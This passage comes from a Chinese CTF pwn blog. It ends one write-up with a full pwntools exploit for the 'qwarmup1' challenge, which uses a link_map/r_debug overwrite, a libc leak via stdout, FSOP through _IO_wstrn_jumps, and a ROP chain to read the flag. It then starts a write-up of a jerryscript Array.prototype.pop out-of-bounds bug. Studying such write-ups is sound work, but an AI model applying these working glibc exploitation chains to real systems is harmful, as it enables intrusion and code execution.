class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> context</span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./qwarmup1&quot;</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;./ld-linux-x86-64.so.2&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;set debug-file-directory /home/yhellow/tools/debuglibc/2.35-0ubuntu3_amd64/usr/lib/debug/\n&quot;</span></span><br><span class="line"><span class="comment">#cmd +=&quot;b *$rebase(0x14A7)\n&quot;</span></span><br><span class="line"><span class="comment">#cmd +=&quot;b *$rebase(0x14D1)\n&quot;</span></span><br><span class="line"><span class="comment">#cmd +=&quot;b *$rebase(0x14BB)\n&quot;</span></span><br><span class="line"></span><br><span class="line">p = gdb.debug(<span class="string">&quot;./qwarmup1&quot;</span>,cmd)</span><br><span class="line"><span class="comment">#p = process(&quot;./qwarmup1&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1491)\n&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">offset, <span class="built_in">bytes</span>, tag=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(<span class="built_in">bytes</span>):</span><br><span class="line">        p.send(p64(offset + i))</span><br><span class="line">        p.send(p8(byte))</span><br><span class="line">        <span class="keyword">if</span> tag:</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;Success!&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(p32(<span class="number">0xf0000</span>))</span><br><span class="line">size_addr = <span class="number">0x408c</span></span><br><span class="line">link_map_offset = <span class="number">0x3592e0</span>-<span class="number">0x10</span></span><br><span class="line">write(link_map_offset, p8(size_addr-<span class="number">4</span> - elf.got[<span class="string">&quot;write&quot;</span>])) <span class="comment"># overwrite &amp;size-4 = write@libc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line">_IO_2_1_stdout_ = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout_offset = _IO_2_1_stdout_+<span class="number">0xf4000</span>-<span class="number">0x10</span></span><br><span class="line">write(_IO_2_1_stdout_offset,p32(<span class="number">0xfbad1800</span>)) <span class="comment"># _flags</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0x28</span>,<span class="string">b&#x27;\xff&#x27;</span>) </span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_ &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_))</span><br><span class="line">success(<span class="string">&quot;_IO_2_1_stdout_offset &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(_IO_2_1_stdout_offset))</span><br><span class="line"></span><br><span class="line">r_debug_offset = <span class="number">0x359118</span>-<span class="number">0x10</span></span><br><span class="line">write(r_debug_offset+<span class="number">34</span>,<span class="string">b&quot;_IO_flush_all&quot;</span>) <span class="comment"># DT_STRTAB+34 = write =&gt; DT_DEBUG+34 = call_func</span></span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\xb8&#x27;</span>, <span class="literal">False</span>) <span class="comment"># trigger _IO_flush_all</span></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x21ba70</span> </span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\x78&#x27;</span>) <span class="comment"># fix</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FSOP(_IO_flush_all_lockp --&gt; IO_jump_t.__overflow)</span></span><br><span class="line">heap_addr = libc.address - (<span class="number">0xf4000</span> - <span class="number">0x10</span>)</span><br><span class="line">success(<span class="string">&quot;heap_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite _IO_2_1_stdout_</span></span><br><span class="line">write(_IO_2_1_stdout_offset,p32(<span class="number">0x800</span>)) <span class="comment"># flags</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0xc0</span>,p8(<span class="number">0xff</span>)) <span class="comment"># _mode &gt; 1</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0x48</span>,p64(heap_addr)) <span class="comment"># _IO_save_base(rdi)</span></span><br><span class="line">_IO_wstrn_jumps = libc.address + <span class="number">0x215dc0</span> <span class="comment"># vtable(_IO_wstrn_jumps)</span></span><br><span class="line">write(_IO_2_1_stdout_offset+<span class="number">0xd8</span>,p64(_IO_wstrn_jumps+<span class="number">0x28</span>)) <span class="comment"># _IO_wstrn_overflow-&gt;_IO_wdefault_xsgetn</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite _wide_data</span></span><br><span class="line"><span class="comment"># _IO_write_ptr</span></span><br><span class="line">_IO_wide_data_1_offset = <span class="number">0x30d9a0</span>-<span class="number">0x10</span></span><br><span class="line">write(_IO_wide_data_1_offset+<span class="number">0x20</span>,p8(<span class="number">0x2</span>))</span><br><span class="line">write(_IO_wide_data_1_offset+<span class="number">0xe0</span>,p64(heap_addr+<span class="number">0x110</span>-<span class="number">0x18</span>)) <span class="comment"># vtable(fake)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP</span></span><br><span class="line">svcudp_reply26 = libc.address + <span class="number">0x16a1fa</span></span><br><span class="line">pop_r12_r13_r14_ret = libc.address + <span class="number">0x000000000002be4c</span></span><br><span class="line">pop_rsi_ret = libc.address + <span class="number">0x000000000002be51</span></span><br><span class="line">pop_rdi_ret = libc.address + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rdx_r12_ret = libc.address + <span class="number">0x000000000011f497</span></span><br><span class="line">pop_rax_ret = libc.address + <span class="number">0x0000000000045eb0</span></span><br><span class="line">leave_ret = libc.address + <span class="number">0x00000000000562ec</span></span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">syscall_ret = libc.address + <span class="number">0x91396</span></span><br><span class="line"></span><br><span class="line">rop = flat(</span><br><span class="line">    [<span class="string">b&#x27;./flag\x00\x00&#x27;</span>, pop_r12_r13_r14_ret],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, heap_addr - <span class="number">8</span>],</span><br><span class="line">    [leave_ret, pop_rdx_r12_ret],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>,<span class="number">0xdeadbeef</span>],</span><br><span class="line">    [pop_rdi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rsi_ret, <span class="number">0</span>],</span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, pop_rax_ret],</span><br><span class="line">    [<span class="number">2</span>, syscall_ret], <span class="comment"># open(&#x27;/flag&#x27;,0,0)</span></span><br><span class="line">    [pop_rdi_ret, <span class="number">3</span>],</span><br><span class="line">    [pop_rsi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0x40</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, read_addr], <span class="comment"># read(3,&amp;buf,0x40)</span></span><br><span class="line">    [pop_rdi_ret, <span class="number">1</span>],</span><br><span class="line">    [pop_rsi_ret, heap_addr], <span class="comment"># &#x27;./flag&#x27;</span></span><br><span class="line">    [pop_rdx_r12_ret, <span class="number">0x40</span>],</span><br><span class="line">    [<span class="number">0xdeadbeef</span>, write_addr], <span class="comment"># write(1,&amp;buf,0x40)</span></span><br><span class="line">    svcudp_reply26</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">write(<span class="number">0</span>,rop)</span><br><span class="line">write(link_map_offset+<span class="number">0x40</span>+<span class="number">5</span>*<span class="number">0x8</span>, <span class="string">b&#x27;\xb8&#x27;</span>, <span class="literal">False</span>) <span class="comment"># trigger _IO_flush_all</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>小结：</strong></p>
<ul>
<li>复习了一下 <code>_dl_runtime_resolve</code> 的知识</li>
<li>也认识了一个可以控制栈的 gadget（svcudp_reply+26）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7f78243fb1fa</span> &lt;svcudp_reply+<span class="number">26</span>&gt;:    mov    rbp,QWORD PTR [rdi+<span class="number">0x48</span>]  </span><br><span class="line"><span class="number">0x7f78243fb1fe</span> &lt;svcudp_reply+<span class="number">30</span>&gt;:    mov    rax,QWORD PTR [rbp+<span class="number">0x18</span>]  </span><br><span class="line"><span class="number">0x7f78243fb202</span> &lt;svcudp_reply+<span class="number">34</span>&gt;:    lea    r13,[rbp+<span class="number">0x10</span>]             </span><br><span class="line"><span class="number">0x7f78243fb206</span> &lt;svcudp_reply+<span class="number">38</span>&gt;:    mov    DWORD PTR [rbp+<span class="number">0x10</span>],<span class="number">0x0</span>   </span><br><span class="line"><span class="number">0x7f78243fb20d</span> &lt;svcudp_reply+<span class="number">45</span>&gt;:    mov    rdi,r13                    </span><br><span class="line"><span class="number">0x7f78243fb210</span> &lt;svcudp_reply+<span class="number">48</span>&gt;:    call   QWORD PTR [rax+<span class="number">0x28</span>]</span><br><span class="line">    <span class="comment">/* [rdi+0x48]中被放入ROP_addr */</span></span><br><span class="line">    <span class="comment">/* [rax+0x28]中被放入&#x27;leave ret&#x27; */</span></span><br></pre></td></tr></table></figure>
<p>由于 <code>_IO_switch_to_wget_mode</code> 可以控制 [RDX]，我们可以考虑用 <code>setcontext+61</code> 来控制栈，我这里就不演示了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/20/JavaScript%20pwn+Array%20OOB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/20/JavaScript%20pwn+Array%20OOB/" class="post-title-link" itemprop="url">JavaScript pwn+Array OOB</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-20 22:42:10 / Modified: 22:44:33" itemprop="dateCreated datePublished" datetime="2022-08-20T22:42:10+08:00">2022-08-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>easychain1 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64  \</span><br><span class="line">-m 512M \</span><br><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-smp 4 \</span><br><span class="line">-kernel ./vmlinux \</span><br><span class="line">-append &quot;console=ttyS0 nokaslr quiet&quot; \</span><br><span class="line">-initrd rootfs.img \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-nographic</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mkdir /tmp</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t debugfs none /sys/kernel/debug</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mdev -s</span><br><span class="line">/etc/init.d/rcS</span><br><span class="line">ifconfig lo up</span><br><span class="line"></span><br><span class="line">echo -e &quot;Boot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds&quot;</span><br><span class="line"></span><br><span class="line">poweroff -d 120000 -f &amp;</span><br><span class="line">setsid cttyhack setuidgid pwn /pwn</span><br><span class="line"></span><br><span class="line">poweroff -d 0 -f</span><br></pre></td></tr></table></figure>
<ul>
<li>没有加载驱动程序（和常规的 kernel 不太一样）</li>
<li>进入 kernel 后，程序会以 pwn 用户执行 pwn 文件</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bad sp value at call has been detected, the output may be wrong!</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> n; <span class="comment">// [rsp+0h] [rbp-8018h]</span></span><br><span class="line">  <span class="keyword">int</span> js; <span class="comment">// [rsp+4h] [rbp-8014h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+8h] [rbp-8010h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+18h] [rbp-8000h] BYREF</span></span><br><span class="line">  __int64 v8[<span class="number">512</span>]; <span class="comment">// [rsp+7018h] [rbp-1000h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( v8 != (__int64 *)&amp;v7 )</span><br><span class="line">    ;</span><br><span class="line">  v8[<span class="number">511</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;pwn&gt; &quot;</span>);</span><br><span class="line">  n = read(<span class="number">0</span>, buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">  js = open(<span class="string">&quot;./pwn.js&quot;</span>, <span class="number">65</span>);</span><br><span class="line">  write(js, buf, n);</span><br><span class="line">  system(<span class="string">&quot;./jerry ./pwn.js&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>往 pwn.js 输入 JavaScript 脚本，然后用 jerry 解释该脚本</li>
</ul>
<p>jerryscript 是 JavaScript 轻量级引擎：（专门处理 JavaScript 脚本的虚拟机）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__assert_fail(</span><br><span class="line"><span class="string">&quot;source_file_p-&gt;type == SOURCE_SCRIPT&quot;</span>,</span><br><span class="line"><span class="string">&quot;/home/david/github/jerryscript/jerry-main/main-desktop.c&quot;</span>,</span><br><span class="line"><span class="number">0x94</span>u,</span><br><span class="line"><span class="string">&quot;main&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Version: %d.%d.%d%s\n&quot;</span>, <span class="number">3LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot; (0d496966)&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>Version: 3.0.0 (0d496966)</li>
</ul>
<p>源代码地址如下：（Google 搜索 0d496966）</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://gitee.com/mirrors/jerryscript/tree/0d4969661810b9e618485c284c361e597144e9b9">Gitee 极速下载/jerryscript - Gitee.com</a> </li>
</ul>
<p>jerryscript 3.0.0 cve 参考：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.security-database.com/cpe.php?detail=cpe%3A2.3%3Aa%3Ajerryscript%3Ajerryscript%3A3.0.0%3A*%3A*%3A*%3A*%3A*%3A*%3A*">Jerryscript Jerryscript 3.0.0 - Security Database (security-database.com)</a> </li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>可能是魔改源码，可能是 cve，所以我们先 bindiff 一下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://gitee.com/mirrors/jerryscript.git</span><br><span class="line">cd jerryscript</span><br><span class="line">git reset --hard 0d496966</span><br><span class="line">python tools/build.py --build-type=RelWithDebug --strip=off # 带有符号表</span><br></pre></td></tr></table></figure>
<ul>
<li>不过，如果安装成 DEBUG 版本，在调试的时候会遇到和 V8 一样的 <code>DCHECK</code>，导致我们无法正常调试漏洞</li>
<li>这里，我们可以修改一下源码（<code>jerryscript/jerry-core/jrt/jrt.h</code>）： </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JERRY_ASSERT(x)                                     \</span></span><br><span class="line"><span class="meta">  do                                                        \</span></span><br><span class="line"><span class="meta">  &#123;                                                         \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (JERRY_UNLIKELY (!(x)))                              \</span></span><br><span class="line"><span class="meta">    &#123;                                                       \</span></span><br><span class="line"><span class="meta">      jerry_assert_fail (#x, __FILE__, __func__, __LINE__); \</span></span><br><span class="line"><span class="meta">    &#125;                                                       \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line">	<span class="comment">/* &lt;---------------- @ ----------------&gt; */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JERRY_ASSERT(x)                                     \</span></span><br><span class="line"><span class="meta">  do                                                        \</span></span><br><span class="line"><span class="meta">  &#123;                                                         \</span></span><br><span class="line"><span class="meta">    <span class="meta-keyword">if</span> (false)                                              \</span></span><br><span class="line"><span class="meta">    &#123;                                                       \</span></span><br><span class="line"><span class="meta">      JERRY_UNUSED (x);                                     \</span></span><br><span class="line"><span class="meta">    &#125;                                                       \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br></pre></td></tr></table></figure>
<ul>
<li>将 DEBUG 版本下的 <code>JERRY_ASSERT</code> 替换成 RELEASE 版本的 <code>JERRY_ASSERT</code> 即可 </li>
</ul>
<p>这个东西折腾了我好久，先是题目解包错误，导致文件 jerry 少了 400KB，后是 bindiff 分析错误，我换了好几个版本的 bindiff 和 IDA，最后发现是中文路径的问题，干</p>
<p>bindiff 分析如下：</p>
<p><img src="/2022/08/20/JavaScript%20pwn+Array%20OOB/1660095791443.png" alt="1660095791443">  </p>
<ul>
<li>说实话这个有点难找，大概 20~30 个函数的相似度都比较接近（可能是编译的问题）</li>
<li>漏洞点在 <code>ecma_builtin_array_prototype_object_pop</code>：（我在网上的 wp 上看的，要是硬要找还真的够呛）</li>
</ul>
<p><img src="/2022/08/20/JavaScript%20pwn+Array%20OOB/1660097546972.png" alt="1660097546972"> </p>
<ul>
<li>在 IDA 中找到对应的位置：</li>
</ul>
<p><img src="/2022/08/20/JavaScript%20pwn+Array%20OOB/1660097809707.png" alt="1660097809707"> </p>
<ul>
<li>调用 <code>ecma_delete_fast_array_properties</code> 的参数被修改了（<code>a2-1 -&gt; a2-2</code>）</li>
</ul>
<p>由于原文件没有符号，所以直接用 bindiff 对照断点位置：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a5ae2: jerryx_print_value <span class="comment">/* 在print执行时触发 */</span></span><br><span class="line"><span class="number">710</span>ab: ecma_builtin_array_prototype_object_pop <span class="comment">/* 断点触发时,用&#x27;p/x $rdi+0x10&#x27;来获取oob数组的地址 */</span></span><br></pre></td></tr></table></figure>
<p>在开始入侵之前要先了解一些 JavaScript 的知识</p>
<p><strong>Array</strong></p>
<p>Array 的结构体如下：（只挑出了 Array 会使用到的内容）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">ecma_object_descriptor_t</span> type_flags_refs;</span><br><span class="line">  <span class="keyword">jmem_cpointer_t</span> gc_next_cp;</span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">jmem_cpointer_t</span> property_list_cp; <span class="comment">/* 数组的存储区域 */</span></span><br><span class="line">    ...</span><br><span class="line">  &#125; u1;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">jmem_cpointer_t</span> prototype_cp; <span class="comment">/* 数组的原型所在位置 */</span></span><br><span class="line">    ...</span><br><span class="line">  &#125; u2;</span><br><span class="line">&#125; <span class="keyword">ecma_object_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">ecma_object_t</span> object; </span><br><span class="line">  ...</span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      <span class="keyword">uint32_t</span> length; <span class="comment">/* 数组的长度 */</span></span><br><span class="line">      <span class="keyword">uint32_t</span> length_prop_and_hole_count; </span><br><span class="line">    &#125; <span class="built_in">array</span>;</span><br><span class="line">  &#125; u;</span><br><span class="line">&#125; <span class="keyword">ecma_extended_object_t</span>;</span><br></pre></td></tr></table></figure>
<p>有几个属性值解释一下：</p>
<ul>
<li><code>array-&gt;object.u1.property_list_cp</code>：数组的存储区域</li>
<li><code>array-&gt;object.u2.prototype_cp</code>：数组的原型所在位置</li>
<li><code>array-&gt;u.array.length</code>：数组的长度</li>
</ul>
<p>我们来看一个具体的实例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]</span><br></pre></td></tr></table></figure>
<p>在 GDB 中查看：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x555555624f30</span></span><br><span class="line"><span class="number">0x555555624f30</span>:	<span class="number">0x0056005c00560014</span>	<span class="number">0x000000ec00000008</span></span><br><span class="line"><span class="number">0x555555624f40</span>:	<span class="number">0x0000002000000010</span>	<span class="number">0x0000004000000030</span></span><br><span class="line"><span class="number">0x555555624f50</span>:	<span class="number">0x0000006000000050</span>	<span class="number">0x0000008000000070</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>property_list_cp</code> 和 <code>prototype_cp</code>  的值分为 <code>0x5c</code> 和 <code>0x56</code>，它们在取值的时候，会调用一个函数 <code>jmem_decompress_pointer</code> 进行转换 </li>
<li>而 array 的寻址方式就是 <code>jerry_globals_heap + array-&gt;u1.property_list_cp &lt;&lt; 3</code>（其他的条目同理），通过这种方法，就能够减小内存开销（其实就有点像 shadow memory）</li>
</ul>
<p><strong>ArrayBuffer 和 DataView</strong></p>
<p>ArrayBuffer 对象用来表示通用的、固定长度的原始二进制数据缓冲区</p>
<p>ArrayBuffer 不能直接操作，而是要通过类型数组对象或 DataView 对象来操作，它们会将缓冲区中的数据表示为特定的格式，并通过这些格式来读写缓冲区的内容</p>
